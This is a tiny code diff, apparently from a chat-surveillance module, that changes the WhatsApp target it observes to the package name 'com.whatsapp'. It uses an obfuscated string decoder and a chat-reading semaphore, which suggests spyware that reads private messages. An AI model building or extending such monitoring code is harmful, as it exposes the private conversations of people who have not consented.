@@ -38,7 +38,7 @@ public class ChatWhatsapp extends SubModuleChat {
 	private static final int PROGRAM = 0x06;
 
 	private static final String DEFAULT_LOCAL_NUMBER = "local";
-	String pObserving = M.e("whatsapp");
+	String pObserving = M.e("com.whatsapp");
 
 	private String myPhoneNumber = DEFAULT_LOCAL_NUMBER;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
